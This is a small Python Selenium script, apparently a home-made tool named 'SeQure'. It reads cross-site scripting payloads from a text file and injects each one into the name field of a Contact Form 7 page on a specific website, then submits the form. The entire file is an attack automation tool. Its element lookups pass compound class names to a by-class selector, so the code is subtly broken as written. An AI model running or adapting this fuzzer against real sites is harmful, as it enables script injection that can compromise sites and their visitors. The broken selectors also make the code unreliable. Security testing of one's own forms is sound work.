from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
import time
import os


def testScripts(script):
    s = Service("C:/Users/alexi/Desktop/chromedriver/chromedriver")
    driver = webdriver.Chrome(service=s)
    driver.get("https://lex.chompe.rs/contact-form-v4-0-1/")
    name_field = driver.find_element(By.CLASS_NAME, 'wpcf7-form-control wpcf7-text wpcf7-validates-as-required') # 
    #subject_field = driver.find_element(By.CLASS_NAME, 'wpcf7-form-contact-wrap your-subject')
    name_field.send_keys(script) # searches for query;send script
    #subject_field.send_keys(script)
    button = driver.find_element(By.CLASS_NAME, 'wpcf7-form-control wpcf7-submit') # creates button
    time.sleep(5)
    driver.execute_script("arguments[0].click();", button) # finds button; presses button
    time.sleep(5)


if __name__ == "__main__":
    clear = lambda: os.system('cls')
    clear() # clear screen
    print("[+] Welcome to SeQure!\n") # starting prompt
    payloadScripts = open("xss-payload-list.txt", "r") # opens text file
    with payloadScripts as f:
        for line in f: # for each line
            script = line.strip() # grabs the scripts 1 by 1
            testScripts(script)
    payloadScripts.close()
    # https://xss-game.appspot.com/level1/frame